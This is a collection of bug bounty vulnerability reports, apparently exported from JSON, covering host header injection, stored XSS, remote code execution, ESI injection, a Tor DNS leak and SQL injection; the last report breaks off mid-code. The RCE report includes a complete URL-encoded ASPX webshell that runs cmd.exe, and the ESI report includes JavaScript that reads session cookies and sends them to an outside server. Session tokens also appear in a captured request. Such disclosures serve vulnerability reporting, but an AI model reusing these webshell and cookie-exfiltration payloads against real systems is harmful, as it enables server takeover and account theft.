I hope it will be a happy year for you and for me 😇
Summary:
I found Host Header injection in oslo.io

I tried to use it to show the security effect on users And I found this
Steps To Reproduce:
<image_0>
So we will use X-Forwarded-Host: example.com
Impact
Many things can be done, including deceiving the user and referring to something else or a login page and stealing their account
There is a lot of information about it here :
https://portswigger.net/web-security/host-header



==================================================

Report File: 1072616.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Cross-site Scripting (XSS) - Stored

Contents:

Description:
There is stored XSS Vulnerability on https://█████/██████ by rendering unsafe input being registered on the account name and last name.
███
Step-by-step Reproduction Instructions
Navigate to
Code 330 Bytes
1https://█████/login/?next=/███%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252F████████%252Fcgi%252Flogin.cgi%253Freturn_to%253Dhttps%25253A%25252F%25252F███████%25252Fcgi%25252Fmyaccount.cgi%26client_id%3D6G3AXPQNPXK5SVESYCB8AMCPHQQ3ENCRK8G2QNWY%26state%3DBEAEb6NGMQ7kWZwZS2pNNFv4p7JwBk86%26scope%3Dopenid%2520profile
Create your account, with your name as <IMG SRC=X ONERROR=ALERT(1)>
Log in and navigate to https://███/██████
Suggested Mitigation/Remediation Actions
Sanitizing the input on the account name fields will prevent the issue.
Best Regards
nagli
Impact
Executing javascript on behalf of the victim



==================================================

Report File: 1072832.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Code Injection

Contents:

Note
In the days leading up to this event, I looked at ███████ due to the ████████ press release which described this as the scope for this event. I understand that this is outside of the current scope but I feel obligated to report this.
Press release: ██████████
"During the third iteration the entire ██████ domain can be targeted by participants as well, but rewards will be paid only for discovering certain categories of vulnerabilities."
Summary
The endpoint at ████ is vulnerable to a remote code execution vulnerability. The ?rdExportFilename= parameter allows an attacker to write any filetype to any folder and the rdReportName parameter allows them to control the contents. This allows them to write a webshell to the server.
Reproduction Steps:
Visit ██████████and login with the credentials: █████
Go here: ██████and scroll down to the "Reports" section. i
Choose any of them and click "Run Report". In the pop-up, click Run Report again.
You will be redirected to █████?rdNoShowWait=True. Wait for this page to load.
Start intercepting requests with Burp Suite.
In the upper right-hand corner, click "Export to Excel" and intercept the POST request to /RServer/rdPage.aspx
Change the rdReportFormat and the rdExcelOutputFormat query parameters to NativeExcel.
Change the rdExportFilename parameter to yourfilename.aspx
In the POST body, change the rdReportName parameter to your url-encoded aspx shell:
Code 3.51 KiB
1%3c%25%40%20%50%61%67%65%20%4c%61%6e%67%75%61%67%65%3d%22%43%23%22%25%3e%3c%25%40%20%49%6d%70%6f%72%74%20%4e%61%6d%65%73%70%61%63%65%3d%22%53%79%73%74%65%6d%22%20%25%3e%0d%0a%3c%25%20%0d%0a%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%20%70%72%6f%63%65%73%73%20%3d%20%6e%65%77%20%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%28%29%3b%0d%0a%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%53%74%61%72%74%49%6e%66%6f%20%73%74%61%72%74%49%6e%66%6f%20%3d%20%6e%65%77%20%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%53%74%61%72%74%49%6e%66%6f%28%29%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%55%73%65%53%68%65%6c%6c%45%78%65%63%75%74%65%20%3d%20%66%61%6c%73%65%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%52%65%64%69%72%65%63%74%53%74%61%6e%64%61%72%64%4f%75%74%70%75%74%20%3d%20%74%72%75%65%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%46%69%6c%65%4e%61%6d%65%20%3d%20%22%43%4d%44%2e%65%78%65%22%3b%0d%0a%73%74%72%69%6e%67%20%63%6d%64%20%3d%20%52%65%71%75%65%73%74%2e%51%75%65%72%79%53%74%72%69%6e%67%5b%22%36%38%63%32%63%38%62%31%66%63%34%37%37%36%36%65%61%66%34%33%30%32%37%61%38%65%61%63%61%31%32%31%22%5d%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%41%72%67%75%6d%65%6e%74%73%20%3d%20%22%2f%63%20%22%2b%63%6d%64%3b%0d%0a%70%72%6f%63%65%73%73%2e%53%74%61%72%74%49%6e%66%6f%20%3d%20%73%74%61%72%74%49%6e%66%6f%3b%0d%0a%70%72%6f%63%65%73%73%2e%53%74%61%72%74%28%29%3b%0d%0a%73%74%72%69%6e%67%20%6f%75%74%70%75%74%20%3d%20%70%72%6f%63%65%73%73%2e%53%74%61%6e%64%61%72%64%4f%75%74%70%75%74%2e%52%65%61%64%54%6f%45%6e%64%28%29%3b%0d%0a%52%65%73%70%6f%6e%73%65%2e%57%72%69%74%65%28%6f%75%74%70%75%74%29%3b%0d%0a%70%72%6f%63%65%73%73%2e%57%61%69%74%46%6f%72%45%78%69%74%28%29%3b%0d%0a%0d%0a%25%3e%3c%25%40%20%50%61%67%65%20%4c%61%6e%67%75%61%67%65%3d%22%43%23%22%25%3e%3c%25%40%20%49%6d%70%6f%72%74%20%4e%61%6d%65%73%70%61%63%65%3d%22%53%79%73%74%65%6d%22%20%25%3e%0d%0a%3c%25%20%0d%0a%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%20%70%72%6f%63%65%73%73%20%3d%20%6e%65%77%20%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%28%29%3b%0d%0a%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%53%74%61%72%74%49%6e%66%6f%20%73%74%61%72%74%49%6e%66%6f%20%3d%20%6e%65%77%20%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%53%74%61%72%74%49%6e%66%6f%28%29%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%55%73%65%53%68%65%6c%6c%45%78%65%63%75%74%65%20%3d%20%66%61%6c%73%65%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%52%65%64%69%72%65%63%74%53%74%61%6e%64%61%72%64%4f%75%74%70%75%74%20%3d%20%74%72%75%65%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%46%69%6c%65%4e%61%6d%65%20%3d%20%22%43%4d%44%2e%65%78%65%22%3b%0d%0a%73%74%72%69%6e%67%20%63%6d%64%20%3d%20%52%65%71%75%65%73%74%2e%51%75%65%72%79%53%74%72%69%6e%67%5b%22%36%38%63%32%63%38%62%31%66%63%34%37%37%36%36%65%61%66%34%33%30%32%37%61%38%65%61%63%61%31%32%31%22%5d%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%41%72%67%75%6d%65%6e%74%73%20%3d%20%22%2f%63%20%22%2b%63%6d%64%3b%0d%0a%70%72%6f%63%65%73%73%2e%53%74%61%72%74%49%6e%66%6f%20%3d%20%73%74%61%72%74%49%6e%66%6f%3b%0d%0a%70%72%6f%63%65%73%73%2e%53%74%61%72%74%28%29%3b%0d%0a%73%74%72%69%6e%67%20%6f%75%74%70%75%74%20%3d%20%70%72%6f%63%65%73%73%2e%53%74%61%6e%64%61%72%64%4f%75%74%70%75%74%2e%52%65%61%64%54%6f%45%6e%64%28%29%3b%0d%0a%52%65%73%70%6f%6e%73%65%2e%57%72%69%74%65%28%6f%75%74%70%75%74%29%3b%0d%0a%70%72%6f%63%65%73%73%2e%57%61%69%74%46%6f%72%45%78%69%74%28%29%3b%0d%0a%0d%0a%25%3e
Now forward the request and you will be redirected to your shell.
Proof:
████████//RServer/rdDownload/rdExport-2b03ab86-09b8-47d8-82de-53c8d7a59f8d/7a4280fce025fa5e30901b4512dff3177a4280fce025fa5e30901b4512dff3177a4280fce025fa5e30901b4512dff3177a4280fce025fa5e30901b4512dff317.aspx?68c2c8b1fc47766eaf43027a8eaca121=whoami
████████
whoami: █████████
HTTP Request Dump
Code 10.25 KiB
1POST /RServer/rdPage.aspx?rdReport=agContentAccess&rdDataCache=1361055732&rdShowModes=%3dIIF(Left(%22agContentAccess%22%2c2)%20%3d%20%22ag%22%2c%20%22rdAgTable%22%2c%20)&rdReportFormat=NativeExcel&rdRequestForwarding=Form&rdExcelOutputFormat=NativeExcel&rdExportFilename=7a4280fce025fa5e30901b4512dff3177a4280fce025fa5e30901b4512dff3177a4280fce025fa5e30901b4512dff3177a4280fce025fa5e30901b4512dff317.aspx HTTP/1.1
2Host:████████
3Connection: close
4Content-Length: 4639
5Cache-Control: max-age=0
6Upgrade-Insecure-Requests: 1
7Origin: ██████
8Content-Type: application/x-www-form-urlencoded
9User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
10Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
11Sec-Fetch-Site: same-origin
12Sec-Fetch-Mode: navigate
13Sec-Fetch-User: ?1
14Sec-Fetch-Dest: document
15Referer: ████?rdNoShowWait=True
16Accept-Encoding: gzip, deflate
17Accept-Language: en-US,en;q=0.9
18Cookie: rdShowWaitUID=c866fd33-1ea8-4a08-8a2b-dc54372b4f2c; ASP.NET_SessionId=uaxhmmo4ffs3phxyysunzr3f; owin.skinId=4C90EFD0820345C0897EF44ED6BFC332; UserDomainId=ML.BASE.Domain.Id.Core; mg.requesttrackingid=3b29f9d0-7c04-4f82-8f2b-0f4a86f43ac2; mg.localeid=en-US; _ga=GA1.2.824910952.1609908283; _gid=GA1.2.630356640.1609908283; mg.clientid=9xWgk3zROzU07cGA3nzzMF%2BO1W4afEGAdu2uNjg2CXBVoQpFuWN4%2FeicI3GZIb3JC8yKByiGir5V%2BmZGLS8fGqUC9i8lSSmtXYwIxfnho3lC4ahL; mg.redirect=d2KfXvekHELGNGGoPlFEpw3k7XNMApDZNg%2FX321fCnKKl0oVS4Xte0MFhD7l6%2BQi%2B6deUP2WhILOx6BIZYYnCDj7XkSBqrqpJhFkEedsBI3MnQBWMs78soQwn9tLS0SwnjIG0EFbUbR6%2FnDZYlpqBgCQqCyqqq%2BrHdb2p4pc1B%2FvOq6idhVmG54nsfgQmiTa7pcYB8PVmTT9F%2FDMjci%2FNXCeIX5htjwRci6s6IMePVh3ZWQIkPaUokBw1GuKzIXZIZGAazWo0ap0SN3jEXFoJUJkNwZ8DTGdsYsES707KKr8EPoBM6q2AnP8YpBBEA6nb9LjhlJgb%2FfkJJ%2BetO5gNtt6mcVSZhsfMvtn4YNSYS6YqhkkOiEbLDzmtEJQn7kJxS4RVSov6L8zF40u2BY8dW2jnZ3VxK49EVqex014le8768GuRT5xWNT8dP7CRmKGQ2zGtxvUw2TZqM8Im%2FNT8smuCGieA17bi%2B3f7ghJwvQIdEZT9huOoo09FDBqAC9eS7Fplav8VLtjIYmZA7Fb6yneh%2BzDJv8gbcM%2FisQFrZB9V4Jnlto1mdprhmPrfjAHgTVFjmC%2F%2Bmd9zlkVrVgsTLJcc1I%3D; mg.request_scheme=u5fPP8roFKP%2Fx%2BF6Pv90Mts7z4X8%2FhA%2FrJSII5oiuPpBHpfSJawLK7jKe3FMdYq%2Fw55Xzw%3D%3D; mg.signin=; mg.id_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlBrSFZlaVlRVFotWXdJNk9ZM0xIdjNJWkNRdyIsImtpZCI6IlBrSFZlaVlRVFotWXdJNk9ZM0xIdjNJWkNRdyJ9.eyJpc3MiOiJodHRwczovL2xtcy5td3IuYXJteS5taWwvaWRzZXJ2L2xvZ2luIiwiYXVkIjoiNUI2RDRFREUwRDk1NDE3Mjk4NDdEQUM5RDZCNkUwRDUiLCJleHAiOjE2MTAwMzA0NTEsIm5iZiI6MTYwOTk0NDA1MSwibm9uY2UiOiI5M2U4ZmViYjYwODA0MmY1OWFhOTJhNTdiNmUyMGQ2NyIsImlhdCI6MTYwOTk0NDA1MSwic2lkIjoiMDM4YjgzZThkZGQ3MGNjMWI3ODk5OGExNzVhNDI2ZWMiLCJzdWIiOiI1NDBCMDg3NzcwMTY0RTRFQTI0Q0ZGNTE3M0Y1M0QzNiIsImF1dGhfdGltZSI6MTYwOTk0NDA1MSwiaWRwIjoicGFzc3dvcmQiLCJuYW1lIjoiY2RsMTMzNyIsImdpdmVuX25hbWUiOiJDb3JiZW4iLCJmYW1pbHlfbmFtZSI6ImFzZGYiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy93ZWJwYWdlIjoicGFzc3dvcmQiLCJhbXIiOlsiZXh0ZXJuYWwiXX0.GkWU8LxgwcpXKiXhjBDPaccucwxaIoQkqaLvs6ZFj_HYGRe7zetpzFYgOMFJXuBcO3e0Yk8ZClvspABvSFrc3TDEPxIyb-kJUgyp2QvoBZjdYHZFGUvYqZeaYD4sVwGCz6pvVUhiAdPxXf20PmTQXbIxkHMkEchp2z7S_F-HEtIavI9nRXyekXX0wZY78C1d71LMhImC3JdkcANj-giddDbTdpz2OmPyXMrOC3PEGxO5rVX8oimkcz1jdgJ3vvLpyDeZ8fBMCuVT5TgFoAMa5aM8nu8FIP5euKqohYHFxpP6MuVw35NQkMUnf-iC2VCElp6X8USB7SA0s0kze3kfEA; mg.loginmethodology=password; MGKIToken=USR_LMS_USER_ID=540B087770164E4EA24CFF5173F53D36&DomainId=ML.BASE.Domain.Id.Core&LocaleId=en-US&KISessionId=7142f58b-5ee9-4391-8f79-41cabd05b359; mgauthtoken=D6124B94CC676F01318D455CB75AF13582B2FE697C75F6277A640F60A3628468FA6983F27575A440EFEC2758E9B924701F0C055E3935AEBFD1649DF3A667D12C9E1264B0E8E605A4099521E9F9D53BD313D4CA36D43B13B2150663E3C8F540D291F680CA73AB57D0F48C65003C95027F9E1C928A2EB88A8FB9D4FB3FC4EDCA064FCA167255B849389736BDBEA869A40382A3511B9C7410AEA04DBAF2D03AC043F4809E18; RequestLocaleId=en-US; strFeedback=; rdShowWaitUID=c866fd33-1ea8-4a08-8a2b-dc54372b4f2c; rdPanelExpanded_Table=True; rdTablePanelMenuExpanded=False; rdAllowRedo=False; rdAllowUndo=False
19
20rdCSRFKey=1cd8a8e9-1362-465b-958b-798ff44f440d&itxSaveNewLayout=&AgReportLayoutGUID=02f74a12-70b6-4033-ad15-364a30e2cde8&rdAgDataColumnDetails=%2CLAST_NAME%3BLast+Name%3AText%2CFIRST_NAME%3BFirst+Name%3AText%2CCOURSE_NAME%3BContent+Title%3AText%2CCONTENT_TYPE%3BContent+Type%3AText%2CSTART_DATE%3BStart+Date%3ADateTime%2CCOMPLETE_DATE%3BComplete+Date%3ADateTime%2CLAST_ACCESS_DATE%3BLast+Launch%3ADateTime%2CATTEMPT%3BTotal+Launches%3ANumber%2COPT_USR_JOB_TITLE%3BJob+Title%3AText%2COPT_USR_MANAGER_ID%3BManager%3AText%2COPT_USR_EMAIL_ADDRESS%3BEmail+Address%3AText%2COPT_USR_ORGANIZATION_ID%3BOrganization%3AText%2COPT_USR_STATE_ID%3BState%3AText%2COPT_USR_COUNTRY_ID%3BCountry%3AText%2COPT_USER_ACTIVITY%3BActivity%3AText%2COPT_USR_LOGIN_ID%3BLogin+ID%3AText%2COPT_USR_LMS_USER_ID%3BUser+ID%3AText%2COPT_GLAIT_ALTERNATE_ID%3BGLAIT+Alternate+ID%3AText%2COPT_CNTVER_VERSION_NUMBER%3BVersion+Number%3AText&rdAgCurrentOpenPanel=&rdAllowCrosstabBasedOnCurrentColumns=True&rdAgCalcName=&rdAgCalcDataColumns=&rdAgCalcFormula=&rdAgCalcDataTypes=Number&rdAgCalcFormats=&rdAfMode_rdAgAnalysisFilter=Design&rdAfFilterColumnID_rdAgAnalysisFilter=&rdAfFilterOperator_rdAgAnalysisFilter=%3D&rdAfSlidingTimeStartDateFilterOperator_rdAgAnalysisFilter=Specific+Date&rdAfSlidingTimeStartDateFilterOperatorOptions_rdAgAnalysisFilter=Today&rdAfFilterStartDate_rdAgAnalysisFilter=&rdAfFilterStartDate_rdAgAnalysisFilter_Hidden=&rdReformatDaterdAfFilterStartDate_rdAgAnalysisFilter=yyyy-MM-dd&rdDateFormatrdAfFilterStartDate_rdAgAnalysisFilter=M%2Fd%2Fyyyy&rdAfFilterStartTime_rdAgAnalysisFilter=&rdAfFilterStartTime_rdAgAnalysisFilter_Hidden=8%3A48+AM&rdReformatTimerdAfFilterStartTime_rdAgAnalysisFilter=HH%3Amm%3Ass&rdFormatTimerdAfFilterStartTime_rdAgAnalysisFilter=t&rdAfSlidingTimeEndDateFilterOperator_rdAgAnalysisFilter=Specific+Date&rdAfSlidingTimeEndDateFilterOperatorOptions_rdAgAnalysisFilter=Today&rdAfFilterEndDate_rdAgAnalysisFilter=&rdAfFilterEndDate_rdAgAnalysisFilter_Hidden=&rdReformatDaterdAfFilterEndDate_rdAgAnalysisFilter=yyyy-MM-dd&rdDateFormatrdAfFilterEndDate_rdAgAnalysisFilter=M%2Fd%2Fyyyy&rdAfFilterEndTime_rdAgAnalysisFilter=&rdAfFilterEndTime_rdAgAnalysisFilter_Hidden=8%3A48+AM&rdReformatTimerdAfFilterEndTime_rdAgAnalysisFilter=HH%3Amm%3Ass&rdFormatTimerdAfFilterEndTime_rdAgAnalysisFilter=t&rdAfFilterValue_rdAgAnalysisFilter=&rdAfFilterValueMax_rdAgAnalysisFilter=&rdAgCurrentOpenTablePanel=&rdAgId=agResults&rdAgReportId=agContentAccess&rdAgDraggablePanels=True&rdAgPanelOrder=rowTable&rdICL-iclLayout=colRowNumber%2CcolLastName%2CcolFirstName%2CcolContentTitle%2CcolContentType%2CcolStartDate%2CcolCompleteDate%2CcolLastAccessDate%2CcolTotalLaunches%2CcolReportMenu%2C&iclLayout_rdExpandedCollapsedHistory=&iclLayout=colRowNumber&iclLayout=colLastName&iclLayout=colFirstName&iclLayout=colContentTitle&iclLayout=colContentType&iclLayout=colStartDate&iclLayout=colCompleteDate&iclLayout=colLastAccessDate&iclLayout=colTotalLaunches&iclLayout=colReportMenu&rdAgGroupColumn=&rdAgPickDateColumnsForGrouping=%2CSTART_DATE%2CCOMPLETE_DATE%2CLAST_ACCESS_DATE%2C&rdAgDateGroupBy=&rdAgAggrColumn=&rdAgAggrFunction=SUM&rdAgAggrRowPosition=RowPositionTop&rdAgOrderColumn=&rdAgOrderDirection=Ascending&rdAgPaging=ShowPaging&rdAgRowsPerPage=25&rdAgCurrentOpenTablePanel=&rdPanelTitle_actAddToDashboardDataTable=Table&rdPanelDescription_actAddToDashboardDataTable=&rdShowElementHistory=&strECOrderStatus=&strOptionalSets=UserShort%2CUserId%2CVersion&userID=540B087770164E4EA24CFF5173F53D36&SkinValue=4C90EFD0820345C0897EF44ED6BFC332&CurrentUserId=540B087770164E4EA24CFF5173F53D36&rdReportSubType=&RequestLocaleId=en-US&strOrderNumber=&strTrainingPeriodDeadline=&rdWaitCaption=Loading+.+.+.&strContentTypeEC=&strPageRowCount=25&strExternalLearningTitle=&TZMinutesOffset=-60&strDateFrom=1%2F1%2F1997+1%3A00%3A00+AM&strIncludeInactiveUser=F&strCompletionStatus=&strProgressStatus=&rdReportName=%3c%25%40%20%50%61%67%65%20%4c%61%6e%67%75%61%67%65%3d%22%43%23%22%25%3e%3c%25%40%20%49%6d%70%6f%72%74%20%4e%61%6d%65%73%70%61%63%65%3d%22%53%79%73%74%65%6d%22%20%25%3e%0d%0a%3c%25%20%0d%0a%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%20%70%72%6f%63%65%73%73%20%3d%20%6e%65%77%20%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%28%29%3b%0d%0a%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%53%74%61%72%74%49%6e%66%6f%20%73%74%61%72%74%49%6e%66%6f%20%3d%20%6e%65%77%20%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%53%74%61%72%74%49%6e%66%6f%28%29%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%55%73%65%53%68%65%6c%6c%45%78%65%63%75%74%65%20%3d%20%66%61%6c%73%65%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%52%65%64%69%72%65%63%74%53%74%61%6e%64%61%72%64%4f%75%74%70%75%74%20%3d%20%74%72%75%65%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%46%69%6c%65%4e%61%6d%65%20%3d%20%22%43%4d%44%2e%65%78%65%22%3b%0d%0a%73%74%72%69%6e%67%20%63%6d%64%20%3d%20%52%65%71%75%65%73%74%2e%51%75%65%72%79%53%74%72%69%6e%67%5b%22%36%38%63%32%63%38%62%31%66%63%34%37%37%36%36%65%61%66%34%33%30%32%37%61%38%65%61%63%61%31%32%31%22%5d%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%41%72%67%75%6d%65%6e%74%73%20%3d%20%22%2f%63%20%22%2b%63%6d%64%3b%0d%0a%70%72%6f%63%65%73%73%2e%53%74%61%72%74%49%6e%66%6f%20%3d%20%73%74%61%72%74%49%6e%66%6f%3b%0d%0a%70%72%6f%63%65%73%73%2e%53%74%61%72%74%28%29%3b%0d%0a%73%74%72%69%6e%67%20%6f%75%74%70%75%74%20%3d%20%70%72%6f%63%65%73%73%2e%53%74%61%6e%64%61%72%64%4f%75%74%70%75%74%2e%52%65%61%64%54%6f%45%6e%64%28%29%3b%0d%0a%52%65%73%70%6f%6e%73%65%2e%57%72%69%74%65%28%6f%75%74%70%75%74%29%3b%0d%0a%70%72%6f%63%65%73%73%2e%57%61%69%74%46%6f%72%45%78%69%74%28%29%3b%0d%0a%0d%0a%25%3e&strSectionActivity=T&strContentActivity=T&strTrainingPeriodStatus=&strIncludeInactiveContent=F&strDateTo=1%2F7%2F2021+12%3A59%3A59+AM&CurrentDomainId=ML.BASE.Domain.Id.Core&strOrderNumberSearchType=ML.BASE.DV.SearchContains&RequestTimeZoneId=20&strContentTypeRT=&strReportId=ML.BASE.RPT.AG.ContentAccess.Manager&SystemCurrencySymbol=%24&strECItemStatus=&strUserActivity=T&KviewPath=https%3A%2F%2Flms.mwr.army.mil&strExternalLearningType=&strContentType=&strExemptionType=&blnHasManagePerm=F&rdReportType=MANAGER&strDeliveryMethod=&RequestRegionId=en-US&strExternalLearningStatus=&rdAfFilterValueBoolean_rdAgAnalysisFilter=False&rdAgExcludeDetailRowsCheckbox=False&rdAgHideFunctionNamesCheckbox=False&rdRnd=7503
Impact
Critical, an attacker can execute commands on this military server.
Best,
@cdl



==================================================

Report File: 1073780.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Cross-site Scripting (XSS) - Reflected

Contents:

Hi,
Summary
There is an ESI injection vulnerability in the https://████████/portal/page/portal/TOPLEVELSITE/SearchResults/PerspectiveResults endpoint on the ms parameter. With this injection, we're able to extract session cookies that have the HttpOnly flag by using this payload.
Code 43 Bytes
1<esi:vars>$(HTTP_HEADER{Cookie})</esi:vars>
We also found a Reflected XSS vulnerability in the https://████████/portal/pls/portal/PORTAL.wwexp_render.show_tree endpoint on the title parameter
By chaining these 2 bugs together, we're able to steal session cookies and take over a victim user's account.
 
Steps To Reproduce
1- By browsing here https://████████/portal/page/portal/TOPLEVELSITE/SearchResults/PerspectiveResults?osf=&ms=lol<esi:vars>$(HTTP_HEADER{Cookie})</esi:vars>lol&mo=containsall&pg=&sepg=-1&fi=&fs=&ft=&pu=1&has=&as=17%2C0%3B48%2C0&saa=ALL&po=matchall&pi=&pc=&co=equal&ci=&p_action=SUBMIT&ll=, we're able to see your cookies in the Search field between the lol strings at the beginning and end.
█████████
2- When browsing here, https://█████████/portal/pls/portal/PORTAL.wwexp_render.show_tree?p_otype=SITEMAP&p_request=open&p_minusimage=&p_plusimage=&p_headerimage=%2Fimages%2Fbhfind2.gif&p_show_banner=NO&p_show_cancel=NO&p_open_item=1.FOLDER.FOLDERMAP.1_0&p_open_items=0.SITEMAP.FOLDERMAP.0_-1&p_domain=wwc&p_sub_domain=FOLDERMAP&p_title=Browse+Pages</title><svg/onload=alert(domain)>&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.ft&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.fi&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.fs&p_datasource_data=nls_sub_domain%3Dtext%2Cnls_name%3Dfolderplpopup, we can see an alert box showing the vulnerable domain caused by this HTML and JavaScript code in the title parameter.
Code 34 Bytes
1</title><svg/onload=alert(domain)>
████████
3- To chain these 2 bugs together, we created the following PoC. This JavaScript code is fetching the URL containing the ESI injection, grabbing the value of the cookies in the response and then sending them over to our server in order to steal them.
Code 702 Bytes
1fetch('https://████████/portal/page/portal/TOPLEVELSITE/SearchResults/PerspectiveResults?osf=&ms=lol<esi:vars>$(HTTP_HEADER{Cookie})</esi:vars>lol&mo=containsall&pg=&sepg=-1&fi=&fs=&ft=&pu=1&has=&as=17%2C0%3B48%2C0&saa=ALL&po=matchall&pi=&pc=&co=equal&ci=&p_action=SUBMIT&ll=').then(function (response) {
2		return response.text();
3}).then(function (html) {
4
5	var parser = new DOMParser();
6	var doc = parser.parseFromString(html, 'text/html');
7  
8  //var input = doc.querySelector('input')[0];
9  var cookies = doc.getElementById("x61_ms").value;
10  fetch(`https://www.jr0ch17.com/ato?cookies=${cookies}`);
11
12}).catch(function (err) {
13	// There was an error
14	console.warn('Something went wrong.', err);
15});
To trigger this whole PoC, you can browse to this URL. You can replace the server with your own to reproduce it.
Code 634 Bytes
1https://████████/portal/pls/portal/PORTAL.wwexp_render.show_tree?p_otype=SITEMAP&p_request=open&p_minusimage=&p_plusimage=&p_headerimage=%2Fimages%2Fbhfind2.gif&p_show_banner=NO&p_show_cancel=NO&p_open_item=1.FOLDER.FOLDERMAP.1_0&p_open_items=0.SITEMAP.FOLDERMAP.0_-1&p_domain=wwc&p_sub_domain=FOLDERMAP&p_title=Browse+Pages</title><script/src='https://www.jr0ch17.com/hta3.js'></script>&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.ft&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.fi&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.fs&p_datasource_data=nls_sub_domain%3Dtext%2Cnls_name%3Dfolderplpopup
As you can see, the XSS payload is now the following.
Code 54 Bytes
1</title><script/src='https://www.jr0ch17.com/hta3.js'>
We can then see that we have received the victim's cookies including the session cookie which has the HttpOnly flag.
██████████
 
Impact
By chaining these 2 vulnerabilities together and by tricking a victim user into clicking a link, an attacker is able to steal their session cookies which have the HttpOnly flag and take over their account. With an ESI injection and depending on the configuration, it's also potentially possible to get an SSRF and get access to internal resources. We're still exploring that area of the bug at the moment so we'll provide updates on if we're able to get further with it.
Let me know if you have any questions or require more details.
Thanks,
@jr0ch17



==================================================

Report File: 1077022.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Information Disclosure

Contents:

Summary:
When a user navigates to a URL in Tor Window, the DNS requests are sent directly without using the Tor proxy, which leaks the user's real IP address and the requested domain name to the user's ISP and the DNS server.
Products affected:
OS: Ubuntu 18.04.5 LTS x86_64
Brave: Version 1.18.78 Chromium: 87.0.4280.141 (Official Build) (64-bit)
Steps To Reproduce:
Open WireShark, and start capturing traffic on the Internet interface. Set WireShark's display filter to dns.
Open Brave Browser. Then open new private window with Tor.
On the Tor window, navigate to https://tools.ietf.org/ (or any other URLs)
In WireShark, you can see a DNS request for tools.ietf.org sent to your DNS server.
Supporting Material/References:
a screenshot attached
Impact
Brave's Tor window passively leaks users' IP addresses and requests to DNS servers. This undermines the user's anonymity.



==================================================

Report File: 1081145.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- SQL Injection

Contents:

Summary:
The vulnerability is located in the /include/findusers.php script:
Code 642 Bytes
1281.			$total = $user_handler->getUserCountByGroupLink(@$_POST["groups"], $criteria);
2282.	
3283.			$validsort = array("uname", "email", "last_login", "user_regdate", "posts");
4284.			$sort = (!in_array($_POST['user_sort'], $validsort)) ? "uname" : $_POST['user_sort'];
5285.			$order = "ASC";
6286.			if (isset($_POST['user_order']) && $_POST['user_order'] == "DESC") {
7287.				$order = "DESC";
8288.			}
9289.	
10290.			$criteria->setSort($sort);
11291.			$criteria->setOrder($order);
12292.			$criteria->setLimit($limit);
13293.			$criteria->setStart($start);
14294.			$foundusers = $user_handler->getUsersByGroupLink(@$_POST["groups"], $criteria, TRUE);
User input passed through the "groups" POST parameter is not properly sanitized before being passed to the icms_member_Handler::getUserCountByGroupLink() and icms_member_Handler::getUsersByGroupLink() methods at lines 281 and 294. These methods use the first argument to construct a SQL query without proper validation:
Code 527 Bytes
1461.		public function getUsersByGroupLink($groups, $criteria = null, $asobject = false, $id_as_key = false) {
2462.			$ret = array();
3463.	
4464.			$select = $asobject ? "u.*" : "u.uid";
5465.			$sql[] = "	SELECT DISTINCT {$select} "
6466.					. "	FROM " . icms::$xoopsDB->prefix("users") . " AS u"
7467.					. " LEFT JOIN " . icms::$xoopsDB->prefix("groups_users_link") . " AS m ON m.uid = u.uid"
8468.					. "	WHERE 1 = '1'";
9469.			if (! empty($groups)) {
